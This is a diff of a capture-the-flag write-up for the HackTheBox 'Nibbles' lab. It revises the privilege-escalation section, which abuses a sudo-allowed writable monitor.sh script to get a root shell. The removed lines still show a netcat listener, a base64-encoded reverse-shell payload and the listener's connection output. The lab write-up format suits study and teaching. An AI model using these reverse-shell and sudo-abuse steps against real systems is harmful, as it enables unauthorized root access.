@@ -441,7 +441,8 @@ It caught the reverse shell!
 ### Stabilizing the shell
 
 Usually I would use SSH to stabilize the shell, but for some reason SSH gives an
-extremely limited shell, so I'll use a simple one-liner:
+extremely limited shell, so I'll use this one-liner to stabilize a bit the shell
+by spawning a tty:
 
 ```sh
 script "/dev/null" -qc "/bin/bash"
@@ -736,48 +737,34 @@ that we have control over this path, we simply have to create our own
 
 ### Preparation
 
-The goal is to obtain a reverse shell.
+The goal is to obtain an elevated shell.
 
-First, I'll setup a listener to receive the shell.
-
-```sh
-❯ rlwrap nc -lvnp "9002"
-```
-
-Then, I'll choose the Base64 encoded version of the 'Bash -i' payload from
-[RevShells](https://www.revshells.com/) configured to obtain a `/bin/bash`
-shell.
-
-### Exploitation
-
-Let's create the `/personal/stuff` directory in our home folder.
-
-Then, let's place a `monitor.sh` file in this new directory containing our
-payload:
+I'll create a `monitor.sh` script in `/home/nibbler/personal/stuff` to execute
+`/bin/bash`:
 
 ```sh
 #!/bin/bash
 
-/bin/echo <BASE64_REVSHELL_PAYLOAD> | /usr/bin/base64 -d | /bin/bash -i
+/bin/bash -i
 ```
 
-I'll also make it executable.
+Then, I'll make it executable.
 
-Finally, let's abuse our `sudo` permissions to execute it as `root`:
+### Exploitation
+
+Let's abuse our `sudo` permissions to execute the
+`/home/nibbler/personal/stuff/monitor.sh` file as `root`:
 
 ```sh
 nibbler@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my_image$ sudo "/home/nibbler/personal/stuff/monitor.sh"
 ```
 
-If we check our listener:
-
 ```
-connect to [10.10.14.5] from (UNKNOWN) [10.10.10.75] 60798
 <SNIP>
 root@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my_image#
 ```
 
-It caught the reverse shell!
+Yay!
 
 ### Stabilizing the shell
 
